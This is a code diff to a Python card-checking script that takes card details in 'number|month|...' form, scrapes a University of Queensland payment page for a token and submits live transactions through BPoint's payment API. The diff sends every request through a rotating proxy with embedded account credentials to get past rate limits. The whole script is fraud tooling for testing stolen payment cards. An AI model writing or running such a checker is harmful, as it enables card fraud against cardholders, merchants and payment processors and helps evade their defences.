@@ -1,6 +1,10 @@
 import requests,re
+import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -27,7 +31,7 @@ def Tele(ccx):
 	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = requests.get('https://www.stleos.uq.edu.au/make-a-payment-bpoint/', headers=headers)
+	response = session.get('https://www.stleos.uq.edu.au/make-a-payment-bpoint/', headers=headers)
 	
 	authorization = re.search(r'"authorization":"(.*?)"', response.text).group(1)
 	#print(authorization)
@@ -52,7 +56,7 @@ def Tele(ccx):
 	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = requests.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
+	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
 	
 	authkey = response.json()['authkey']
 	#print(authkey)
@@ -92,7 +96,7 @@ def Tele(ccx):
 	    'testMode': False,
 	}
 	
-	response = requests.put(
+	response = session.put(
 	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
 	    headers=headers,
 	    json=json_data,
@@ -126,7 +130,7 @@ def Tele(ccx):
 	    },
 	}
 	
-	response = requests.put(
+	response = session.put(
 	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
 	    headers=headers,
 	    json=json_data,
@@ -162,7 +166,7 @@ def Tele(ccx):
 	    'updateToken': True,
 	}
 	
-	response = requests.post(
+	response = session.post(
 	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
 	    headers=headers,
 	    json=json_data,
